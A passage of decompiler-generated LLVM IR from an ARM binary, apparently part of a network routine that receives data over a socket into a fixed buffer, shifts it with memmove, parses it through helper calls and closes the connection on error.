  %v0_a170 = load i32, i32* @r8, align 4
  %v1_a170 = add i32 %v0_a170, 656
  %v2_a170 = inttoptr i32 %v1_a170 to i32*
  %v3_a170 = load i32, i32* %v2_a170, align 4
  store i32 %v3_a170, i32* %r3.global-to-local, align 4
  %v1_a178 = add i32 %v3_a170, -1024
  %v2_a178 = icmp ugt i32 %v3_a170, 1023
  store i1 %v2_a178, i1* %cpsr_c.global-to-local, align 1
  %v3_a178 = sub i32 1023, %v3_a170
  %v4_a178 = and i32 %v3_a178, %v3_a170
  %v5_a178 = icmp slt i32 %v4_a178, 0
  store i1 %v5_a178, i1* %cpsr_v.global-to-local, align 1
  %v6_a178 = icmp slt i32 %v1_a178, 0
  store i1 %v6_a178, i1* %cpsr_n.global-to-local, align 1
  %v7_a178 = icmp eq i32 %v3_a170, 1024
  store i1 %v7_a178, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a164, i32* %fp.global-to-local, align 4
  %v1_a180 = add i32 %v0_a168, 2116
  store i32 %v1_a180, i32* @r7, align 4
  br i1 %v7_a178, label %dec_label_pc_a280, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a164, %dec_label_pc_a280, %dec_label_pc_a274
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a18c = load i32, i32* %fp.global-to-local, align 4
  %v2_a18c = inttoptr i32 %v1_a18c to i32*
  store i32 0, i32* %v2_a18c, align 4
  %v0_a190 = load i32, i32* @r8, align 4
  %v1_a190 = add i32 %v0_a190, 656
  %v2_a190 = inttoptr i32 %v1_a190 to i32*
  %v3_a190 = load i32, i32* %v2_a190, align 4
  store i32 %v3_a190, i32* %r1.global-to-local, align 4
  %v1_a194 = add i32 %v0_a190, -1456
  %v2_a194 = inttoptr i32 %v1_a194 to i32*
  %v3_a194 = load i32, i32* %v2_a194, align 4
  store i32 %v3_a194, i32* %r0.global-to-local, align 4
  %v1_a198 = sub i32 1024, %v3_a190
  store i32 %v1_a198, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a1a0 = load i32, i32* @r7, align 4
  %v2_a1a0 = add i32 %v0_a1a0, %v3_a190
  store i32 %v2_a1a0, i32* %r1.global-to-local, align 4
  %v4_a1a4 = call i32 @_recv(i32 %v3_a194, i32 %v2_a1a0, i32 %v1_a198, i32 16384)
  store i32 %v4_a1a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1a8 = icmp slt i32 %v4_a1a4, 0
  store i1 %v1_a1a8, i1* %cpsr_n.global-to-local, align 1
  %v2_a1a8 = icmp eq i32 %v4_a1a4, 0
  store i1 %v2_a1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a8, label %dec_label_pc_a684, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a188
  %v1_a1b0 = add i32 %v4_a1a4, 1
  %v2_a1b0 = icmp eq i32 %v4_a1a4, -1
  store i1 %v2_a1b0, i1* %cpsr_c.global-to-local, align 1
  %v3_a1b0 = sub i32 0, %v4_a1a4
  %v4_a1b0 = and i32 %v1_a1b0, %v3_a1b0
  %v5_a1b0 = icmp slt i32 %v4_a1b0, 0
  store i1 %v5_a1b0, i1* %cpsr_v.global-to-local, align 1
  %v6_a1b0 = icmp slt i32 %v1_a1b0, 0
  store i1 %v6_a1b0, i1* %cpsr_n.global-to-local, align 1
  %v7_a1b0 = icmp eq i32 %v1_a1b0, 0
  store i1 %v7_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b0, label %dec_label_pc_a6a8, label %dec_label_pc_a1b8

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1b0
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = add i32 %v0_a1b8, 656
  %v2_a1b8 = inttoptr i32 %v1_a1b8 to i32*
  %v3_a1b8 = load i32, i32* %v2_a1b8, align 4
  store i32 %v2_9530, i32* %r1.global-to-local, align 4
  %v2_a1c0 = add i32 %v3_a1b8, %v4_a1a4
  store i32 %v2_a1c0, i32* @r4, align 4
  store i32 %v2_a1c0, i32* %v2_a1b8, align 4
  %v0_a1c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c8 = load i32, i32* @r8, align 4
  %v2_a1c8 = add i32 %v1_a1c8, -1448
  %v3_a1c8 = inttoptr i32 %v2_a1c8 to i32*
  store i32 %v0_a1c8, i32* %v3_a1c8, align 4
  br label %dec_label_pc_a254

dec_label_pc_a1d0:                                ; preds = %dec_label_pc_a254
  %v1_a1d0 = add i32 %v0_a254, -4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  %v3_a1d0 = load i32, i32* %v2_a1d0, align 4
  store i32 %v3_a1d0, i32* @sl, align 4
  %v1_a1d4 = load i32, i32* @r4, align 4
  %v5_a1d8 = icmp slt i32 %v3_a254, %v1_a1d4
  %storemerge73 = select i1 %v5_a1d8, i32 %v3_a254, i32 %v1_a1d4
  store i32 %storemerge73, i32* @r5, align 4
  %v2_a1e0 = sub i32 %v3_a254, %storemerge73
  store i32 %v2_a1e0, i32* @r6, align 4
  %v1_a1e4 = add i32 %v3_a1d0, -1
  %v2_a1e4 = icmp ne i32 %v3_a1d0, 0
  store i1 %v2_a1e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a1e4 = sub i32 0, %v3_a1d0
  %v4_a1e4 = and i32 %v3_a1d0, %v3_a1e4
  %v5_a1e4 = icmp slt i32 %v4_a1e4, 0
  store i1 %v5_a1e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a1e4 = icmp slt i32 %v1_a1e4, 0
  store i1 %v6_a1e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a1e4 = icmp eq i32 %v3_a1d0, 1
  store i1 %v7_a1e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a1e0, i32* %v2_a254, align 4
  br i1 %v7_a1e4, label %dec_label_pc_a2a0, label %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge

dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge: ; preds = %dec_label_pc_a1d0
  %v0_a1f0.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge, %dec_label_pc_a2c8
  %v0_a1f0 = phi i32 [ %v3_a2c8, %dec_label_pc_a2c8 ], [ %v0_a1f0.pr.pre, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge ], [ %v3_a254, %dec_label_pc_a260 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1f0 = icmp slt i32 %v0_a1f0, 0
  store i1 %v1_a1f0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1f0 = icmp eq i32 %v0_a1f0, 0
  store i1 %v2_a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a218

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1f0
  %v0_a1f8 = load i32, i32* @r8, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 4
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i32*
  %v3_a1f8 = load i32, i32* %v2_a1f8, align 4
  store i32 %v3_a1f8, i32* @r4, align 4
  %v1_a1fc = add i32 %v3_a1f8, -1
  %v2_a1fc = icmp ne i32 %v3_a1f8, 0
  store i1 %v2_a1fc, i1* %cpsr_c.global-to-local, align 1
  %v3_a1fc = sub i32 0, %v3_a1f8
  %v4_a1fc = and i32 %v3_a1f8, %v3_a1fc
  %v5_a1fc = icmp slt i32 %v4_a1fc, 0
  store i1 %v5_a1fc, i1* %cpsr_v.global-to-local, align 1
  %v6_a1fc = icmp slt i32 %v1_a1fc, 0
  store i1 %v6_a1fc, i1* %cpsr_n.global-to-local, align 1
  %v7_a1fc = icmp eq i32 %v3_a1f8, 1
  store i1 %v7_a1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1fc, label %dec_label_pc_a2d0, label %dec_label_pc_a204

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1f8
  %v1_a204 = add i32 %v0_a1f8, 656
  %v2_a204 = inttoptr i32 %v1_a204 to i32*
  %v3_a204 = load i32, i32* %v2_a204, align 4
  %v0_a208 = load i32, i32* @r5, align 4
  %v2_a208 = sub i32 %v3_a204, %v0_a208
  store i32 %v2_a208, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a20c = icmp slt i32 %v2_a208, 0
  store i1 %v1_a20c, i1* %cpsr_n.global-to-local, align 1
  %v2_a20c = icmp eq i32 %v2_a208, 0
  store i1 %v2_a20c, i1* %cpsr_z.global-to-local, align 1
  %v2_a210 = add i32 %v0_a1f8, 8
  %v3_a210 = inttoptr i32 %v2_a210 to i32*
  store i32 %v2_a208, i32* %v3_a210, align 4
  br i1 %v2_a20c, label %dec_label_pc_a158, label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2d0, %dec_label_pc_a204, %dec_label_pc_a358
  %v0_a218 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a218 = icmp slt i32 %v0_a218, 0
  store i1 %v1_a218, i1* %cpsr_n.global-to-local, align 1
  %v2_a218 = icmp eq i32 %v0_a218, 0
  store i1 %v2_a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a218, label %dec_label_pc_a268, label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a218
  %v0_a220 = load i32, i32* @r8, align 4
  %v1_a220 = add i32 %v0_a220, 656
  %v2_a220 = inttoptr i32 %v1_a220 to i32*
  %v3_a220 = load i32, i32* %v2_a220, align 4
  store i32 %v3_a220, i32* %r3.global-to-local, align 4
  %v2_a224 = sub i32 %v3_a220, %v0_a218
  store i32 %v2_a224, i32* %r4.global-to-local, align 4
  store i32 %v2_a224, i32* %r2.global-to-local, align 4
  store i32 %v2_a224, i32* %v2_a220, align 4
  %v0_a230 = load i32, i32* @r7, align 4
  %v1_a230 = load i32, i32* @r5, align 4
  %v2_a230 = add i32 %v1_a230, %v0_a230
  store i32 %v2_a230, i32* %r1.global-to-local, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v3_a238 = call i32 @_memmove(i32 %v0_a230, i32 %v2_a230, i32 %v2_a224)
  store i32 %v3_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @r8, align 4
  %v1_a23c = add i32 %v0_a23c, 656
  %v2_a23c = inttoptr i32 %v1_a23c to i32*
  %v3_a23c = load i32, i32* %v2_a23c, align 4
  store i32 %v3_a23c, i32* @r4, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a244 = load i32, i32* %sb.global-to-local, align 4
  %v2_a244 = add i32 %v1_a244, %v3_a23c
  store i32 %v2_a244, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a248 = icmp slt i32 %v3_a23c, 0
  store i1 %v1_a248, i1* %cpsr_n.global-to-local, align 1
  %v2_a248 = icmp eq i32 %v3_a23c, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v3_a24c = add i32 %v2_a244, 2116
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 0, i8* %v4_a24c, align 1
  %v0_a250 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a250, label %dec_label_pc_a268, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a1b8
  %v0_a254 = load i32, i32* @r8, align 4
  %v1_a254 = add i32 %v0_a254, 8
  %v2_a254 = inttoptr i32 %v1_a254 to i32*
  %v3_a254 = load i32, i32* %v2_a254, align 4
  store i32 %v3_a254, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a258 = icmp slt i32 %v3_a254, 0
  store i1 %v1_a258, i1* %cpsr_n.global-to-local, align 1
  %v2_a258 = icmp eq i32 %v3_a254, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %v5_a25c = icmp sgt i32 %v3_a254, 0
  br i1 %v5_a25c, label %dec_label_pc_a1d0, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a254
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a268:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a218
  %v0_a268 = load i32, i32* @r8, align 4
  %v1_a268 = add i32 %v0_a268, -1452
  %v2_a268 = inttoptr i32 %v1_a268 to i8*
  %v3_a268 = load i8, i8* %v2_a268, align 1
  %v4_a268 = zext i8 %v3_a268 to i32
  store i32 %v4_a268, i32* %r3.global-to-local, align 4
  %v2_a26c = icmp ugt i8 %v3_a268, 6
  store i1 %v2_a26c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a26c = icmp ult i8 %v3_a268, 7
  store i1 %v6_a26c, i1* %cpsr_n.global-to-local, align 1
  %v7_a26c = icmp eq i8 %v3_a268, 7
  store i1 %v7_a26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a26c, label %dec_label_pc_a274, label %dec_label_pc_9590

dec_label_pc_a274:                                ; preds = %dec_label_pc_a268
  %v1_a274 = add i32 %v0_a268, 656
  %v2_a274 = inttoptr i32 %v1_a274 to i32*
  %v3_a274 = load i32, i32* %v2_a274, align 4
  store i32 %v3_a274, i32* %r3.global-to-local, align 4
  %v1_a278 = add i32 %v3_a274, -1024
  %v2_a278 = icmp ugt i32 %v3_a274, 1023
  store i1 %v2_a278, i1* %cpsr_c.global-to-local, align 1
  %v3_a278 = sub i32 1023, %v3_a274
  %v4_a278 = and i32 %v3_a278, %v3_a274
  %v5_a278 = icmp slt i32 %v4_a278, 0
  store i1 %v5_a278, i1* %cpsr_v.global-to-local, align 1
  %v6_a278 = icmp slt i32 %v1_a278, 0
  store i1 %v6_a278, i1* %cpsr_n.global-to-local, align 1
  %v7_a278 = icmp eq i32 %v3_a274, 1024
  store i1 %v7_a278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a278, label %dec_label_pc_a280.loopexit, label %dec_label_pc_a188

dec_label_pc_a280.loopexit:                       ; preds = %dec_label_pc_a274
  %v0_a280.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a280

dec_label_pc_a280:                                ; preds = %dec_label_pc_a280.loopexit, %dec_label_pc_a164
  %v0_a280 = phi i32 [ %v0_a280.pre, %dec_label_pc_a280.loopexit ], [ %v1_a180, %dec_label_pc_a164 ]
  store i32 %v0_a280, i32* %r0.global-to-local, align 4
  %v1_a284 = add i32 %v0_a280, 64
  store i32 %v1_a284, i32* %r1.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_a28c = call i32 @_memmove(i32 %v0_a280, i32 %v1_a284, i32 960)
  store i32 %v3_a28c, i32* %r0.global-to-local, align 4
  %v0_a290 = load i32, i32* @r8, align 4
  %v1_a290 = add i32 %v0_a290, 656
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  store i32 %v3_a290, i32* %r3.global-to-local, align 4
  %v1_a294 = add i32 %v3_a290, -64
  store i32 %v1_a294, i32* @r4, align 4
  store i32 %v1_a294, i32* %v2_a290, align 4
  br label %dec_label_pc_a188

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a1d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_a2a8 = call i32 @function_13044(i32 36, i32* null)
  %v0_a2ac = load i32, i32* @r4, align 4
  store i32 %v0_a2ac, i32* %r1.global-to-local, align 4
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a2b8 = load i32, i32* @r7, align 4
  store i32 %v0_a2b8, i32* %r0.global-to-local, align 4
  %v4_a2bc = call i32 @function_13b18(i32 %v0_a2b8, i32 %v0_a2ac, i32 %v3_a2a8, i32 11)
  store i32 %v4_a2bc, i32* %r0.global-to-local, align 4
  %v2_a2c0 = add i32 %v4_a2bc, 1
  %v3_a2c0 = icmp eq i32 %v4_a2bc, -1
  store i1 %v3_a2c0, i1* %cpsr_c.global-to-local, align 1
  %v4_a2c0 = sub i32 0, %v4_a2bc
  %v5_a2c0 = and i32 %v2_a2c0, %v4_a2c0
  %v6_a2c0 = icmp slt i32 %v5_a2c0, 0
  store i1 %v6_a2c0, i1* %cpsr_v.global-to-local, align 1
  %v7_a2c0 = icmp slt i32 %v2_a2c0, 0
  store i1 %v7_a2c0, i1* %cpsr_n.global-to-local, align 1
  %v8_a2c0 = icmp eq i32 %v2_a2c0, 0
  store i1 %v8_a2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a2c0, label %dec_label_pc_a2c8, label %dec_label_pc_a82c

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a0
  %v0_a2c8 = load i32, i32* @r8, align 4
  %v1_a2c8 = add i32 %v0_a2c8, 8
  %v2_a2c8 = inttoptr i32 %v1_a2c8 to i32*
  %v3_a2c8 = load i32, i32* %v2_a2c8, align 4
  store i32 %v3_a2c8, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a1f8
  %v0_a2d0 = load i32, i32* @r7, align 4
  store i32 %v0_a2d0, i32* %r0.global-to-local, align 4
  %v1_a2d4 = add i32 %v0_a1f8, 656
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i32*
  %v3_a2d4 = load i32, i32* %v2_a2d4, align 4
  store i32 %v3_a2d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a2e0 = call i32 @function_13b18(i32 %v0_a2d0, i32 %v3_a2d4, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  store i32 %v5_a2e0, i32* %r0.global-to-local, align 4
  %v1_a2e4 = add i32 %v5_a2e0, 1
  %v2_a2e4 = icmp eq i32 %v5_a2e0, -1
  store i1 %v2_a2e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a2e4 = sub i32 0, %v5_a2e0
  %v4_a2e4 = and i32 %v1_a2e4, %v3_a2e4
  %v5_a2e4 = icmp slt i32 %v4_a2e4, 0
  store i1 %v5_a2e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a2e4 = icmp slt i32 %v1_a2e4, 0
  store i1 %v6_a2e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a2e4 = icmp eq i32 %v1_a2e4, 0
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2e4, label %dec_label_pc_a218, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2d0
  %v0_a2ec = load i32, i32* @r8, align 4
  %v1_a2ec = add i32 %v0_a2ec, 656
  %v2_a2ec = inttoptr i32 %v1_a2ec to i32*
  %v3_a2ec = load i32, i32* %v2_a2ec, align 4
  store i32 %v3_a2ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @r7, align 4
  store i32 %v0_a2f8, i32* %r0.global-to-local, align 4
  %v5_a2fc = call i32 @function_13b18(i32 %v0_a2f8, i32 %v3_a2ec, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2)
  %v1_a300 = load i32, i32* %sb.global-to-local, align 4
  %v2_a300 = add i32 %v1_a300, %v5_a2fc
  store i32 %v2_a300, i32* %ip.global-to-local, align 4
  store i32 %v5_a2fc, i32* @r5, align 4
  store i32 %v5_a2fc, i32* %r1.global-to-local, align 4
  %v0_a30c = load i32, i32* @r7, align 4
  store i32 %v0_a30c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32* %r2.global-to-local, align 4
  %v0_a314 = load i32, i32* @r4, align 4
  store i32 %v0_a314, i32* %r3.global-to-local, align 4
  %v0_a318 = load i32, i32* @r6, align 4
  %v1_a318 = trunc i32 %v0_a318 to i8
  %v3_a318 = add i32 %v2_a300, 2114
  %v4_a318 = inttoptr i32 %v3_a318 to i8*
  store i8 %v1_a318, i8* %v4_a318, align 1
  %v4_a31c = call i32 @function_13b18(i32 %v0_a30c, i32 %v5_a2fc, i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32 %v0_a314)
  store i32 %v4_a31c, i32* %r0.global-to-local, align 4
  %v1_a320 = add i32 %v4_a31c, 1
  %v2_a320 = icmp eq i32 %v4_a31c, -1
  store i1 %v2_a320, i1* %cpsr_c.global-to-local, align 1
  %v3_a320 = sub i32 0, %v4_a31c
  %v4_a320 = and i32 %v1_a320, %v3_a320
  %v5_a320 = icmp slt i32 %v4_a320, 0
  store i1 %v5_a320, i1* %cpsr_v.global-to-local, align 1
  %v6_a320 = icmp slt i32 %v1_a320, 0
  store i1 %v6_a320, i1* %cpsr_n.global-to-local, align 1
  %v7_a320 = icmp eq i32 %v1_a320, 0
  store i1 %v7_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a320, label %dec_label_pc_a344, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a2ec
  %v0_a328 = load i32, i32* @r7, align 4
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32* %r2.global-to-local, align 4
  %v0_a334 = load i32, i32* @r4, align 4
  store i32 %v0_a334, i32* %r3.global-to-local, align 4
  %v4_a338 = call i32 @function_13b18(i32 %v0_a328, i32 %v0_a32c, i32 ptrtoint (i32* @global_var_143d4.97 to i32), i32 %v0_a334)
  %v1_a33c = load i32, i32* %sb.global-to-local, align 4
  %v2_a33c = add i32 %v1_a33c, %v4_a338
  store i32 %v2_a33c, i32* %r0.global-to-local, align 4
  %v0_a340 = load i32, i32* @r6, align 4
  %v1_a340 = trunc i32 %v0_a340 to i8
  %v3_a340 = add i32 %v2_a33c, 2116
  %v4_a340 = inttoptr i32 %v3_a340 to i8*
  store i8 %v1_a340, i8* %v4_a340, align 1
  br label %dec_label_pc_a344

dec_label_pc_a344:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a328
  %v0_a344 = load i32, i32* @r7, align 4
  store i32 %v0_a344, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_a34c = inttoptr i32 %v0_a344 to i8*
  %v3_a34c = call i32 @function_13b80(i8* %v2_a34c, i32 16)
  store i32 %v3_a34c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a350 = icmp slt i32 %v3_a34c, 0
  store i1 %v1_a350, i1* %cpsr_n.global-to-local, align 1
  %v2_a350 = icmp eq i32 %v3_a34c, 0
  store i1 %v2_a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a350, label %dec_label_pc_aadc, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a344
  %v1_a358 = add i32 %v3_a34c, 2
  store i32 %v1_a358, i32* %r6.global-to-local, align 4
  %v1_a35c = load i32, i32* @r8, align 4
  %v2_a35c = add i32 %v1_a35c, 8
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v1_a358, i32* %v3_a35c, align 4
  br label %dec_label_pc_a218

dec_label_pc_a364:                                ; preds = %dec_label_pc_9a0c
  %v0_a364 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a364, i32* %r1.global-to-local, align 4
  %v0_a368 = load i32, i32* @r6, align 4
  store i32 %v0_a368, i32* @r0, align 4
  %v2_a36c = inttoptr i32 %v0_a368 to i8*
  %v3_a36c = call i32 @function_13a7c(i8* %v2_a36c, i32 %v0_a364)
  store i32 %v3_a36c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a24

dec_label_pc_a374:                                ; preds = %dec_label_pc_9588
  %v0_a374 = call i32* @__errno_location()
  %v2_a374 = ptrtoint i32* %v0_a374 to i32
  store i32 %v2_a374, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_a374, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge, %dec_label_pc_a374
  %v1_a380 = phi i32 [ %v1_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ %v2_a374, %dec_label_pc_a374 ]
  %v0_a380 = phi i32 [ %v0_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ 0, %dec_label_pc_a374 ]
  %v2_a380 = inttoptr i32 %v1_a380 to i32*
  store i32 %v0_a380, i32* %v2_a380, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v0_a388 = load i32, i32* @r8, align 4
  %v1_a388 = add i32 %v0_a388, -1456
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  %v3_a388 = load i32, i32* %v2_a388, align 4
  store i32 %v3_a388, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a394 = call i32 @_recv(i32 %v3_a388, i32 %v2_8fd8, i32 10240, i32 16384)
  store i32 %v4_a394, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a398 = icmp slt i32 %v4_a394, 0
  store i1 %v1_a398, i1* %cpsr_n.global-to-local, align 1
  %v2_a398 = icmp eq i32 %v4_a394, 0
  store i1 %v2_a398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a398, label %dec_label_pc_a678, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a380
  %v2_a3a0 = add i32 %v4_a394, 1
  %v3_a3a0 = icmp eq i32 %v4_a394, -1
  store i1 %v3_a3a0, i1* %cpsr_c.global-to-local, align 1
  %v4_a3a0 = sub i32 0, %v4_a394
  %v5_a3a0 = and i32 %v2_a3a0, %v4_a3a0
  %v6_a3a0 = icmp slt i32 %v5_a3a0, 0
  store i1 %v6_a3a0, i1* %cpsr_v.global-to-local, align 1
  %v7_a3a0 = icmp slt i32 %v2_a3a0, 0
  store i1 %v7_a3a0, i1* %cpsr_n.global-to-local, align 1
  %v8_a3a0 = icmp eq i32 %v2_a3a0, 0
  store i1 %v8_a3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a3a0, label %dec_label_pc_a3a8, label %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge

dec_label_pc_a3a0.dec_label_pc_a380_crit_edge:    ; preds = %dec_label_pc_a3a0
  %v0_a380.pre = load i32, i32* @r5, align 4
  %v1_a380.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a3a0
  %v0_a3a8 = load i32, i32* @r4, align 4
  %v1_a3a8 = inttoptr i32 %v0_a3a8 to i32*
  %v2_a3a8 = load i32, i32* %v1_a3a8, align 4
  store i32 %v2_a3a8, i32* %r3.global-to-local, align 4
  %v1_a3ac = add i32 %v2_a3a8, -11
  %v2_a3ac = icmp ugt i32 %v2_a3a8, 10
  store i1 %v2_a3ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a3ac = sub i32 10, %v2_a3a8
  %v4_a3ac = and i32 %v3_a3ac, %v2_a3a8
  %v5_a3ac = icmp slt i32 %v4_a3ac, 0
  store i1 %v5_a3ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a3ac = icmp slt i32 %v1_a3ac, 0
  store i1 %v6_a3ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a3ac = icmp eq i32 %v2_a3a8, 11
  store i1 %v7_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a3ac, label %dec_label_pc_a7f0, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a8, %dec_label_pc_a678
  %v0_a3b4 = load i32, i32* @r8, align 4
  %v1_a3b4 = add i32 %v0_a3b4, -1456
  %v2_a3b4 = inttoptr i32 %v1_a3b4 to i32*
  %v3_a3b4 = load i32, i32* %v2_a3b4, align 4
  store i32 %v3_a3b4, i32* %r0.global-to-local, align 4
  %v1_a3b8 = call i32 @close(i32 %v3_a3b4)
  store i32 %v1_a3b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @r8, align 4
  %v2_a3c4 = add i32 %v1_a3c4, -1456
